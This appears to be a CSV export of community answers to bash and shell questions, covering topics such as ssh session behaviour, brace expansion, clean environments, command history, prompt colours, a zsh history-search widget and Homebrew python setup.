Title,Id,Tags,Score,Body
"Why does my remote process still run after killing an ssh session?","20679","<linux><bash><ssh>","16","<p>This behaviour stems from the lack of a controlling terminal for the running process. When the remote process does not have a controlling terminal, the remote ssh process handling your session is unable to kill the command, which is left hanging in a zombie state to be eventually cleaned up by init.</p>

<p>You can get around this by running it with a -t option, which gives it a controlling terminal. This will cause the process to terminate when you ctrl-c your ssh command remotely.</p>

<p>The <strong>-t</strong> option:</p>

<blockquote>
  <p>Force pseudo-tty allocation.  This can be used to execute arbitrary 
  screen-based
  programs on a remote
               machine, which can be very useful, e.g. when implementing
  menu services.  Multiple -t options
  force tty
               allocation, even if ssh has no local tty.</p>
</blockquote>

<p>Have a look at <strong>man ssh</strong> and <strong>man sshd</strong> when you use this option as there are other implications of having a controlling terminal, e.g. the ability to send escape characters. </p>
"
"list files numbered in a specific range","236484","<bash><range>","16","<p>Try this:</p>

<pre><code>for file in file{18..31}.txt
</code></pre>

<p>It's known as a ""sequence expression"" and it's part of Bash's <a href=""http://tiswww.case.edu/php/chet/bash/bashref.html#Brace-Expansion"" rel=""noreferrer"">brace expansion</a> feature. It works in Bash 3 and 4.</p>

<p>The increment feature is new to Bash 4. You probably have Bash 3.x. </p>

<p>In Bash 4, you can do:</p>

<pre><code>$ for i in {1..6..2}; do echo $i; done
1
3
5
</code></pre>

<p>But in Bash 3, you have to do this to get the same results:</p>

<pre><code>$ for ((i=1; i&lt;=6; i+=2)); do echo $i; done
</code></pre>

<p>The same form incrementing by one:</p>

<pre><code>$ for ((i=1; i&lt;=6; i++)); do echo $i; done
</code></pre>

<p>Any of the numbers can be variables or expressions. However, in a sequence expression the numbers have to be constants</p>

<p>Here is an example using that form on your files:</p>

<pre><code>for ((i=18; i&lt;=31; i++))
do
    echo ""file${i}.txt""
done
</code></pre>

<p>Another new feature of sequence expressions in Bash 4 is the ability to include leading zeros. This is useful if you want to create (and use) numbered files that can be properly sorted.</p>

<p>In Bash 4:</p>

<pre><code>touch file{001..010}.txt
</code></pre>

<p>would create files named ""file001.txt"" through ""file010.txt"". Their names will sort in the expected order. Without the leading zeros, ""file10.txt"" would sort before ""file1.txt"".</p>

<p>To work with the files, you can use the same leading zero syntax:</p>

<pre><code>for file in file{001..010}.txt; do echo ""$file""; done
</code></pre>

<p>In Bash 3, if you need leading zeros, you need to pad the value yourself: </p>

<pre><code>for i in {1..10}
do
    printf -v i '%03d' $i 
    echo ""file${i}.txt""
done
</code></pre>

<p>The <code>printf</code> statement will prepend the value of i with leading zeros so the width is 3, for example (""4"" becomes ""004"").</p>

<p><strong>Edit:</strong></p>

<p>Accommodating spaces in filenames is straightforward:</p>

<pre><code>$ touch ""space name ""{008..018..3}"" more spaces""
$ ls -l sp*
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000008 more spaces
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000011 more spaces
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000014 more spaces
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000017 more spaces
$ for f in ""space name ""{008..018..3}"" more spaces""; do mv ""$f"" ""${f}.txt""; done
$ ls -l sp*
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000008 more spaces.txt
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000011 more spaces.txt
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000014 more spaces.txt
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000017 more spaces.txt
</code></pre>
"
"Runing a command without inheriting parent's environment","319043","<bash><shell><session>","16","<p>Here's an answer that doesn't require sudo privileges or the user's password, but still provides an environment like what you'd get on a fresh login.</p>

<pre><code>env -i HOME=""$HOME"" bash -l -c 'your_command'
</code></pre>

<p>Example:</p>

<pre><code>$ export ABC=123
$ env -i HOME=""$HOME"" bash -l -c 'env' | grep ABC
$ env HOME=""$HOME"" bash -l -c 'env' | grep ABC
ABC=123
</code></pre>

<p>Breaking this down for explanation:</p>

<ol>
<li><p><code>env -i HOME=""$HOME""</code>: Clears the environment. The <code>-i</code> sets up an empty environment with <em>no variables whatsoever</em>. This is problematic because it means that if you try to naively run <code>bash -l</code> it won't load your <code>.bash_profile</code> etc. because <code>HOME</code> isn't set. To mitigate this, we explicitly pass <code>HOME=""$HOME""</code>, creating an environment where <code>HOME</code> (and only <code>HOME</code>) is set.</p></li>
<li><p><code>bash -l -c ...</code>: Runs the desired command in a login shell. You'll want a login shell for this because we're starting from a clean environment and need to reload everything.</p></li>
</ol>

<p>Notably:</p>

<ul>
<li>This doesn't require sudo privileges (the <code>sudo</code> version does).</li>
<li>This doesn't require typing the user's password (the <code>su</code> version does).</li>
<li>This doesn't require running an SSH server and having a passwordless key that can be used to log back in to the machine (the <code>ssh</code> version does).</li>
</ul>
"
"View all files in a website's directory?","642555","<linux><bash><shell>","16","<p>I was just wondering the same thing. The following is probably not the most efficient solution, but it seems to work. It recreates the directory structure of the webserver locally. (Found the first command via <a href=""https://stackoverflow.com/questions/273743/using-wget-to-recursively-fetch-a-directory-with-arbitrary-files-in-it"">stackoverflow</a>)</p>

<pre><code>wget --spider -r --no-parent http://some.served.dir.ca/
ls -l some.served.dir.ca
</code></pre>
"
"How can I copy a (big) directory over another changing only the files that differ?","241191","<linux><bash><cp><file-transfer>","16","<p>You can use <code>rsync</code> to do this, the command I use is <code>rsync -tr ""folder to copy from"" ""folder to copy to""</code></p>

<p>e.g. <code>rsync -tr /home/me/stuff/* /home/me/otherstuff/</code></p>
"
"How can I enable the bash command history?","174306","<bash>","16","<p>At a Bash prompt, type the following commands and do the steps listed after each one:</p>

<pre><code>set -o | grep history
</code></pre>

<p>If you get ""history off"" then add this line at the end of your <code>~/.bashrc</code>:</p>

<pre><code>set -o history
</code></pre>

<p>Next try:</p>

<pre><code>echo $HISTFILE
echo $HISTSIZE
echo $HISTFILESIZE
</code></pre>

<p>If the first one is blank or <code>/dev/null</code>, add this line to the end of your <code>~/.bashrc</code>:</p>

<pre><code>HISTFILE=$HOME/.bash_history
</code></pre>

<p>If either of the last two print 0, set them to some number like the default of 500:</p>

<pre><code>HISTFILESIZE=500
HISTSIZE=500
</code></pre>
"
"How to a open a file in vim using pipe","769390","<linux><bash><vim><pipe><locate>","16","<p>You're nearly done:</p>

<pre><code>$ locate updatedb | head -1 | xargs vim
</code></pre>

<p>sometimes (under certain terminals) you need reset the terminal after editing.</p>

<pre><code>$ reset
</code></pre>
"
"How do I queue multiple files for copying on a Mac?","328708","<macos><bash><file-transfer><perl>","16","<h2>UltraCopier</h2>

<p><a href=""http://ultracopier.first-world.info/"" rel=""noreferrer"">UltraCopier</a> is a free and <em>cross-platform</em> copy utility that is currently in development, so it's not that neat and polished yet. Once you install it, it sits in your menu bar.</p>

<p>It manages a copy list that allows you to queue <em>copy</em> or <em>move</em> jobs, which are then sequentially processed. You can also define the copy process priority as well as the block size of the transfer.</p>

<p>With the new version you can group with similar source and/or destination, or just always or never.</p>

<p><img src=""https://i.stack.imgur.com/aKAHt.png"" alt=""enter image description here""></p>
"
"iTerm2: Alt-Dot functionality with Cmd-Dot","703911","<macos><bash><iterm2>","16","<p>This looks like part of the EMACS readline bash key bindings i.e. they appear to be key combinations that are used in EMACS and emulated or add-ons to bash, or something.  Mine work as yours do, unfortunately, but I have a workaround since you are speaking with respect to iTerm2:</p>

<p>Go into the Preferences for the profile of the Terminal session you'd like to inflict this upon, and establish the key-binding as illustrated thus:</p>

<p><img src=""https://i.stack.imgur.com/OTwVT.png"" alt=""enter image description here""></p>

<p>This is probably not the solution that you are looking for, however it should work for you in a pinch.</p>
"
"How to open a folder from terminal on a Mac?","289162","<mac><bash><terminal>","16","<p>navigate to the dir and type</p>

<pre><code>open .
</code></pre>
"
"How to print new line character with echo?","443994","<bash><shell><shell-script><newlines><echo>","16","<p>The new line character with the <code>echo</code> command is ""\n"". Taking the following example:</p>

<pre><code>echo -e ""This is line 1\nThis is line 2""
</code></pre>

<p>Would result in the output</p>

<pre><code>This is line 1
This is line 2
</code></pre>

<p>The ""-e"" parameter <em>is</em> important here.</p>
"
"What happens to running processes when I lose a remote connection to a *nix box?","143925","<linux><unix><bash><ssh><remote-access>","16","<p>Normally the processes will terminate upon disconnection, but the old SSH sessions could either be waiting to timeout, or they could have <a href=""http://www.snailbook.com/faq/background-jobs.auto.html"" rel=""nofollow noreferrer"">hung upon exit</a>, due to a race condition.</p>

<p>You should probably terminate the old sessions, although you don't necessarily have to.  Type <code>ps aux</code> on the console to list the processes, then <code>kill PID</code> for each hung ssh session, where PID is the PID (process ID) for that session.  The older, hung sessions should have lower PIDs than your current, new session.</p>

<p>If there is a long-running process that you specifically want to continue running even after you disconnect, you can prefix your command with nohup:</p>

<pre><code>nohup badblocks -nvs /dev/sda &amp;
</code></pre>
"
"How do I symlink each of the files in one directory to another directory?","244634","<linux><mac><command-line><bash>","16","<p>You can use (GNU) <code>cp</code> with the <code>--symbolic-link</code> option:</p>

<pre><code>prompt$ mkdir foo
prompt$ cd foo
prompt$ touch a b c
prompt$ mkdir ../bar
prompt$ cd ../bar
prompt$ cp --symbolic-link ../foo/* .
prompt$ ls -l
total 0
lrwxrwxrwx. 1 hlovdal hlovdal 8 Jun 12 16:24 a -&gt; ../foo/a
lrwxrwxrwx. 1 hlovdal hlovdal 8 Jun 12 16:24 b -&gt; ../foo/b
lrwxrwxrwx. 1 hlovdal hlovdal 8 Jun 12 16:24 c -&gt; ../foo/c
prompt$
</code></pre>
"
"Where are config files located in WSL?","1547945","<linux><windows-10><bash><windows-subsystem-for-linux>","16","<p>I found my <code>etc</code> folder in:</p>
<pre><code>C:\Users\USER\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\etc
</code></pre>
<p>Note: I'm using WSL1 so as to be able to use VMware. WSL2 uses Hyper-V
which is incompatible with other virtualization hypervisors.
(<em>Edit: This is no longer true.</em>)</p>
<p>However, this is changing now and in the near future.
Recently both VirtualBox and VMware have released versions that support
Hyper-V and WSL2. You can learn more about it for
<a href=""https://www.virtualbox.org/wiki/Changelog-6.0"" rel=""nofollow noreferrer"">VirtualBox</a>
and
<a href=""https://blogs.vmware.com/workstation/2020/01/vmware-workstation-tech-preview-20h1.html"" rel=""nofollow noreferrer"">VMware</a>.
The VMware solution requires the soon to be released
<a href=""https://docs.microsoft.com/en-us/windows-insider/at-home/whats-new-wip-at-home-20h1"" rel=""nofollow noreferrer"">Windows 10 Build 20H1</a>, while VirtualBox is possibly
usable now.</p>
<p>This next version of Windows is also advertised as allowing greater
integration between Windows and WSL, perhaps even solving the problem
of concurrent updates of the same files from both subsystems.</p>
"
"Prefix to each output of a command on runtime","623112","<linux><command-line><bash><shell><bash-scripting>","16","<p>I assume that what you are doing in your allcommands.sh is:</p>

<pre><code>command1.sh
command2.sh
</code></pre>

<p>Just relace it with</p>

<pre><code>command1.sh | sed ""s/^/[command1] /""
command2.sh | sed ""s/^/[command2] /""
</code></pre>
"
"one sudo for multiple terminals","588632","<bash><shell><sudo>","16","<p>Turn off <code>tty_tickets</code>. See <a href=""http://www.sudo.ws/sudo/man/1.8.6/sudoers.man.html"" rel=""noreferrer""><code>sudoers(5)</code></a> for more information.</p>

<p>Run <code>visudo</code> and then add a line:</p>

<pre><code>Defaults !tty_tickets
</code></pre>
"
"ssh Permission denied only in cron job","463540","<bash><ssh><cron>","16","<p>Interactive commands and cron jobs run in different environments – in particular, <strong>an interactive session might have a SSH agent running, or a Kerberos TGT stored.</strong> Because of the way <code>ssh</code> orders authentication methods, you <em>cannot</em> be sure that your key is used just because you added the <code>-i</code> option.</p>

<ul>
<li><p>If a SSH agent is running, the <code>ssh</code> client always tries agent keys <em>before</em> using any explicitly-specified keys.</p></li>
<li><p>If the network uses Kerberos and a Kerberos TGT is present, OpenSSH will use it <em>before</em> trying public-key authentication.</p></li>
</ul>

<p>I don't know anything about your environment, but both of these possibilities are easy to check:</p>

<ol>
<li><p>Add <code>unset SSH_AUTH_SOCK</code> and <code>unset KRB5CCNAME</code> before the <code>ssh</code> command, <em>then</em> manually run the modified script.</p>

<p>This will prevent the script from seeing the agent or the Kerberos tickets, and will only use the explicitly-specified key.</p></li>
<li><p>Add the <code>-v</code> option to <code>ssh</code>. This will display more detail on how the authentication happens.</p></li>
</ol>

<p>You can also add <code>-oIdentitiesOnly=yes</code> to the <code>ssh</code> command; this will <a href=""http://www.openbsd.org/cgi-bin/man.cgi?query=ssh_config"" rel=""noreferrer"">force it to use the specified key</a>.</p>

<hr>

<blockquote>
  <p>And if you add tips on accessing the agent from cron - even better</p>
</blockquote>

<p>This is generally not recommended, since the agent is usually closely tied to your interactive login session. In particular, it's only started when you log in, and killed when you log out – and it needs your password to actually unlock the SSH keys (assuming they were password-protected).</p>

<p>You mentioned ""Keychain"" – is this the OS X program, or the Linux script? (I don't know much about the architecture of Mac OS X, but AFAIK it makes it <em>much</em> harder to access the user's ssh-agent from a cronjob...)</p>
"
"Change encoding of txt file","554349","<bash><encoding><echo>","16","<p>You can use <code>iconv</code> to convert the encoding of the file:</p>

<pre><code>iconv -f ascii -t utf16 file2.txt &gt; another.txt
</code></pre>

<p><code>another.txt</code> should then have the desired encoding.</p>

<p>You could also try this:</p>

<pre><code>echo $var | iconv -f ascii -t utf16 &gt; ""file2.txt""
</code></pre>
"
"When should I put configurations into .bashrc vs into. .bash_profile?","10634","<bash>","16","<p><a href=""http://joshstaiger.org/archives/2005/07/bash_profile_vs.html"" rel=""noreferrer"">This post</a> explains that <code>~/.bash_profile</code> is used for login shells, while <code>~/.bashrc</code> is used for other interactive shells. <a href=""http://www.linuxjournal.com/video/bash-startup-scripts-bashrc-and-bashprofile"" rel=""noreferrer"">Here's</a> a useful video as well, which gives the example of some printer settings as something you might want on a login shell. In the end, it really doesn't matter too much, it's just a semantics thing. Plus, as the article says:</p>

<blockquote>
  <p>... the point is generally moot because most people edit the files so one calls the other anyway.</p>
</blockquote>
"
"Ubuntu: Run the output of another command","1018390","<ubuntu><command-line><bash>","15","<p>You seem to have worked this out yourself, but you can use:</p>

<pre><code>$(command parameter1 parameter2)
</code></pre>

<p><strong>Edit of edit:</strong> the below is somewhat wrong, whilst it does run the command in a subshell, it turns out that the environment variables will still be available. Sorry for misleading people...</p>

<p><strong>Edit:</strong> that will run in a subshell, any unexported environment variables won't be used. If you want to run a command in the same shell, you need to use:</p>

<pre><code>eval $(command parameter1 parameter2)
</code></pre>

<p>Another answer given is to pipe through bash itself:</p>

<pre><code>echo 'uname -a' | bash 
</code></pre>

<p>That will also execute in a subshell, to run in the same shell you will need:</p>

<pre><code>echo 'uname -a' | bash -c
</code></pre>

<p>Incidentally, you can also use back ticks instead of the $() syntax, but it's <a href=""http://mywiki.wooledge.org/BashFAQ/082"" rel=""noreferrer"">not recommended</a>.</p>
"
"Replace backslash(""\"") with forward slash(""/"") in a variable in bash","1068031","<bash><bash-scripting>","15","<p>The correct substitution is</p>

<pre><code>home_mf=""${home//\\//}""
</code></pre>

<p>This breaks up as follows:</p>

<ul>
<li><code>//</code> replace every</li>
<li><code>\\</code> backslash</li>
<li><code>/</code> with</li>
<li><code>/</code> slash</li>
</ul>

<p>Demonstration:</p>

<pre><code>$ t='\a\b\c'; echo ""${t//\\//}""
/a/b/c
</code></pre>

<hr>

<p>An alternative that may be easier to read would be to quote the pattern and the replacement:</p>

<pre><code>home_mf=""${home//'\'/""/""}""
</code></pre>
"
"reverse history search with regular expressions","275262","<bash><history><zsh>","15","<h1>Custom widget <code>history-incremental-multi-search</code> for <code>zsh</code></h1>

<h2>Setup</h2>

<p>Create a directory and include it in your <code>$fpath</code> For example, I created a directory <code>~/.zsh/functions</code>, and the line <code>fpath=($HOME/.zsh/functions $fpath)</code> in my <code>.zshrc</code>.</p>

<p>Put the following in a file named <code>history-incremental-multi-search</code> in that directory. </p>

<pre><code>emulate -L zsh
setopt extended_glob

local oldbuffer=$BUFFER
local -i oldcursor=$CURSOR

local dir                # search direction
local chars              # input buffer
local -a words           # search terms
local -a found           # all history items that match first term
local -i hindex=$HISTNO  # current 
local -i lmatch          # last matched history item (for prev/next)

if [[ $WIDGET == *forward* ]]; then
    dir=fwd
else
    dir=bck
fi

function find-next {
    # split the input buffer on spaces to get search terms
    words=(${(s: :)chars})

    # if we have at least one search term
    if (( $#words )); then
        # get all keys of history items that match the first
        found=(${(k)history[(R)*$words[1]*]})
        if (( $#found )); then
            # search in widget direction by default
            # but accept exception in $1 for ""prev match""
            search-${1:-$dir}
        else
            # no matches
            lmatch=$HISTNO
        fi
    else
        # no search terms
        lmatch=$HISTNO
        BUFFER=$oldbuffer
        CURSOR=$oldcursor
    fi
}

function search-fwd {
    # search forward through matches
    local -i i
    for (( i = $#found; i &gt; 0; i-- )); do
        # but not before hindex as we're searching forward
        if [[ $found[$i] -gt $hindex ]]; then
            set-match $found[$i]
        fi
    done
}

function search-bck {
    # search backward through matches
    local -i i
    for (( i = 1; i &lt;= $#found; i++ )); do
        # but not beyond hindex as we're searching backward
        if [[ $found[$i] -lt $hindex ]]; then
            set-match $found[$i]
        fi
    done
}

function set-match {
    # match history item against all terms and select it if successful
    local match=1
    local -i i
    for (( i = 2; i &lt;= $#words; i++ )); do
        if [[ $history[$1] != *$words[$i]* ]]; then
            match=0
            break
        fi
    done
    if [[ $match -ne 0 ]]; then
        lmatch=$1
        BUFFER=$history[$1]
        CURSOR=$#BUFFER
        break
    fi
}

# display sub prompt
zle -R ""${dir}-i-search-multi:""

# handle input keys
while read -k; do
    case $REPLY in
        # next
        $'\C-n' )
            hindex=$lmatch
            find-next
            ;;
        # prev
        $'\C-p' )
            hindex=$lmatch
            if [[ $dir == fwd ]]; then
                find-next bck
            else
                find-next fwd
            fi
            ;;
        # break
        $'\e' | $'\C-g' )
            BUFFER=$oldbuffer
            CURSOR=$oldcursor
            break
            ;;
        # accept
        $'\C-m' | $'\C-j' )
            if [[ $lmatch -eq $HISTNO ]]; then
                BUFFER=$oldbuffer
                CURSOR=$oldcursor
            else
                HISTNO=$lmatch
            fi
            break
            ;;
        # erase char
        $'\C-h' | $'\C-?' )
            chars=$chars[1,-2]
            hindex=$HISTNO
            find-next
            ;;
        # erase word
        $'\C-w' )
            if [[ $chars =~ \  ]]; then
                chars=${chars% *}
            else
                chars=
            fi
            hindex=$HISTNO
            find-next
            ;;
        # kill line
        $'\C-u' )
            chars=
            hindex=$HISTNO
            find-next
            ;;
        # add unhandled chars to buffer
        * )
            chars=${chars}${REPLY}
            hindex=$HISTNO
            find-next
            ;;
    esac

    zle -R ""${dir}-i-search-multi: $words""
done
</code></pre>

<p>Put this in or source it from your <code>.zshrc</code>:</p>

<pre><code>autoload -U history-incremental-multi-search

# make new widgets from function
zle -N history-incremental-multi-search-backward history-incremental-multi-search
zle -N history-incremental-multi-search-forward history-incremental-multi-search

# bind the widgets to keys
bindkey '^Xr' history-incremental-multi-search-backward
bindkey '^Xs' history-incremental-multi-search-forward
</code></pre>

<hr>

<h2>Use</h2>

<p>You should now be able to initiate a backward incremental search with <kbd>Ctrl+X</kbd>, <kbd>r</kbd>, forward with <kbd>Ctrl+X</kbd>, <kbd>s</kbd>.</p>

<p>Type your search terms separated by space. Following keys are available to control it:</p>

<ul>
<li><p><kbd>← Backspace</kbd>: erase character</p></li>
<li><p><kbd>Ctrl+W</kbd>: erase word</p></li>
<li><p><kbd>Ctrl+U</kbd>: kill line</p></li>
<li><p><kbd>Ctrl+N</kbd>: next match</p></li>
<li><p><kbd>Ctrl+P</kbd>: previous match</p></li>
<li><p><kbd>Ctrl+G</kbd>/<kbd>Esc</kbd>: cancel search</p></li>
<li><p><kbd>Enter</kbd>: accept</p></li>
</ul>

<p>This solution can probably be simplified quite a bit. It's more a functional proof of concept, with lots of room for improvement.</p>
"
"I changed my ""HOME"" variable and now cannot find ""~/.bash_profile"" to change it back","1364748","<bash><mac><environment-variables>","15","<p>It's in the same place.</p>

<p>Before the change <code>~</code> expands to something like <code>/Users/YourUserName</code>, the shell finds your <code>.bash_profile</code> there. After the file gets sourced <code>~</code> expands to another path so <code>~/.bash_profile</code> no longer points to the relevant file. This is because in this context <code>~</code> means <code>$HOME</code>.</p>

<p>If you know the full path to your actual home directory, you can use it instead of <code>~</code>. In Mac it would probably look like this:</p>

<pre><code>nano /Users/YourUserName/.bash_profile
</code></pre>

<p>Or let your Bash look up your home directory in the user database rather than just looking at <code>$HOME</code>. This doesn't require you to remember anything:</p>

<pre><code>nano ~YourUserName/.bash_profile
</code></pre>

<p>Modifying your <code>HOME</code> variable without changing your actual home directory is not the best idea. Changing any user's home directory is an administrative task, usually regular users cannot do this.</p>
"
"Bash prompt to change color when I am logged into a server","1118683","<bash><shell><colors><bashrc>","15","<p>The remote prompt is set by the remote <code>~/.bashrc</code>. So you still need to copy it to the remote server. However, you can use a single <code>~/.bashrc</code> for all hosts, and set the prompt color based on hostname:</p>

<pre><code>[ ""$PS1"" ] || return 0                           # continue only when interactive
case $(hostname -s) in
laptop*)
    prompt_color='\033[48;5;16m\033[38;5;46m'    # green(46) on black(16)
    ;;
server*)
    prompt_color='\033[48;5;16m\033[38;5;196m'   # red(196) on black(16)
    ;;
esac
ORIG_PS1=$PS1                                    # in case needed
PS1='&lt;\['${prompt_color}'\]\h\[\033[m\]:\w&gt;\$ '
unset prompt_color
</code></pre>

<p>Notes:</p>

<ul>
<li><p>Don't set <code>PS1</code> if it's not already set (i.e., if the shell is not interactive). Testing if <code>PS1</code> is non-empty is a very common way to decide if the shell is interactive, and you don't want to confuse programs that do that. (Arguably a more accurate test is checking if <code>$-</code> contains <code>i</code>.)</p></li>
<li><p>If you want this code to run when logging into a remote server, you should have one of the profile files always source <code>~/.bashrc</code>. But I assume you know that.</p></li>
<li><p>In <code>PS1</code>, the escape codes must be enclosed in <code>\[...\]</code>.</p></li>
<li><p><code>\[033[m</code> resets foreground and background to default. So here, <code>:\w</code> appear in terminal foreground/background.</p></li>
<li><p><code>\[033[48;5;XXXm\033[38;5;YYYm</code> sets the background/foreground to <code>XXX</code>/<code>YYY</code>.</p></li>
<li><p>For a script that dumps the available colors, try <a href=""http://www.vim.org/scripts/script.php?script_id=1349"" rel=""noreferrer""><code>colortest</code></a>.</p></li>
<li><p>To check what the prompt would look like:</p>

<pre><code>echo -e ""&lt;\033[48;5;16m\033[38;5;196mhost\033[m:dir&gt;$ ""
</code></pre></li>
</ul>
"
"How to pass bash script arguments to a subshell","403263","<bash>","15","<p>Bash's <code>printf</code> command has a feature that'll quote/escape/whatever a string, so as long as both the parent and subshell are actually bash, this should work:</p>

<p>[Edit: as siegi pointed out in a comment, if you do this the obvious way there's a problem when no arguments are supplied, where it acts like there actually was a single empty argument. I've added a workaround below, wrapping the format string with <code>${1+}</code>, which only includes the format string <em>if the first argument is defined</em>. It's a bit of a kluge, but it does work.]</p>

<pre><code>#!/bin/bash

quoted_args=""$(printf ""${1+ %q}"" ""$@"")"" # Note: this will have a leading space before the first arg
# echo ""Quoted args:$quoted_args"" # Uncomment this to see what it's doing
bash -c ""other_tool -a -b$quoted_args""
</code></pre>

<p>Note that you can also do it in a single line: <code>bash -c ""other_tool -a -b$(printf ""${1+ %q}"" ""$@"")""</code></p>
"
"pip not working on hombrew python 2.7 install","915810","<macos><bash><python><homebrew><pip>","15","<p>Generally, <code>homebrew</code> will install a <code>formula</code> into <code>/usr/local/Cellar/formula</code> and then place a link at <code>/usr/local/bin/formula</code>.</p>

<p>To make use of your installed formulae, make sure <code>/usr/local/bin</code> is in your <code>$PATH</code>. Show your <code>$PATH</code> by typing</p>

<pre><code>echo $PATH
</code></pre>

<p>If <code>/usr/local/bin</code> is not in your <code>$PATH</code>, put this line at the end of your <code>~/.profile</code> file.</p>

<pre><code>export PATH=""/usr/local/bin:$PATH""
</code></pre>

<p>Now, check what <code>pythons</code> are found on your OSX by typing:</p>

<pre><code>which -a python
</code></pre>

<p>There should be one python found at <code>/usr/bin/</code> (the Apple python) and one at <code>/usr/local/bin/</code> which is the Homebrew python.</p>

<pre><code>which python
</code></pre>

<p>will show you, which python is found first in your <code>$PATH</code>
and will be executed when you invoke <code>python</code>.</p>

<p>If you want to know, where the executable is, show it by typing</p>

<pre><code>ls -l $(which python)
</code></pre>

<p>This could look like this:
    lrwxr-xr-x  1 root   wheel        68  7 Mai 13:22 python -> /usr/local/bin/python</p>

<p>This will work for <code>pip</code> as well.</p>

<p>If you show the results of this steps, we can probably help you much easier.</p>

<p>-- UPDATE --</p>

<p>You have <code>/usr/local/bin/python</code> linked to <code>/usr/local/Cellar/python/2.7.9/bin/python</code>. -> <code>brew install python</code> worked.</p>

<p>show, if <code>pip</code> is installed by typing</p>

<pre><code>brew list python | grep pip
</code></pre>

<p>You should see</p>

<pre><code>/usr/local/Cellar/python/2.7.9/bin/pip
</code></pre>

<p>If not, check, if there are links, which are not done with <code>brew install</code>. Told you something like this: </p>

<pre><code>""Error: The `brew link` step did not complete successfully
The formula built, but is not symlinked into /usr/local""
</code></pre>

<p>To force the link and overwrite all conflicting files:</p>

<pre><code>brew link --overwrite python
</code></pre>

<p>To list all files that would be deleted:</p>

<pre><code>brew link --overwrite --dry-run python
</code></pre>

<p>** NO standard Apple <code>/usr/bin/python</code> **</p>

<p>link from <code>/usr/local/Cellar/python/2.7.9/bin/python</code> to <code>/usr/bin/python</code></p>

<pre><code>ln -s /usr/local/Cellar/python/2.7.9/bin/python /usr/bin/python
</code></pre>

<p>This is necessary for all python scripts beginning with <code>#!/usr/bin/python</code>. Especialy <code>easy_install</code> will fail, if link is not there.</p>

<p>Now, you are able to run</p>

<pre><code>easy_install pip
</code></pre>

<p>Hope, you're making progress</p>
"
"Who deals with the star * in echo *","901183","<bash><unix><shell><shell-script><stdin>","15","<p>bash (or whatever you use as shell), is the first thing to read any input, and will start interpreting special characters such as <code>?</code> and <code>*</code>. <code>*</code> gets expanded to whatever matches in the <a href=""http://en.wikipedia.org/wiki/Working_directory"" rel=""noreferrer"">CWD</a>, which means that the asterisk is substituted by said matches.</p>

<p>In most cases, this is fairly straght forward, but can lead to some confusing cases from time to time.</p>

<p>Consider the following.
A directory has this contents:</p>

<ul>
<li>test (regular file)</li>
<li>test1 (directory)</li>
<li>test2 (directory)</li>
<li>test3 (directory)</li>
</ul>

<p>If you then type <code>mv *</code> something seemingly weird happens: <code>test3</code> is there, but the rest is gone. While weird at first, it makes sense once you understand what bash actually passes to <code>mv</code>. Because of the asterisk, bash interprets <code>mv *</code> as <code>mv test test1 test2 test3</code>, and when mv gets that list, it'll assume that the last arguement is the destination, which is where all of the files would've been moved.</p>

<p>As for the commands you listed:</p>

<ul>
<li><code>echo *</code> can function as a poor-mans <code>ls</code>. The shell will expand the asterisk to whatever is in that directory, and as I'm sure you already know, <code>echo</code> will literally just echo anything bash passed to it as arguements.</li>
<li><code>cp temp temp*</code> will behave somewhat like the <code>mv</code> command I described above, unless there's only one directory named temp, in which case source and destination name is the same, i.e. it'll do nothing.</li>
</ul>
"
"Echo text in a certain color in a shell script","332223","<bash><shell-script>","15","<p>From ""<a href=""https://www.shellhacks.com/bash-colors/"" rel=""noreferrer"">ShellHacks: Bash Colors</a>"":</p>

<pre><code>echo -e ""\033[33mThis is yellow\033[0m""
</code></pre>

<p>or</p>

<pre><code>echo -e ""\e[33mThis is yellow\e[0m""
</code></pre>

<p><code>\033</code> or <code>\e</code> as an <a href=""http://en.wikipedia.org/wiki/Escape_character"" rel=""noreferrer"">Escape character</a> starts the escape sequence, which in this case contains the controls to change colors.</p>
"
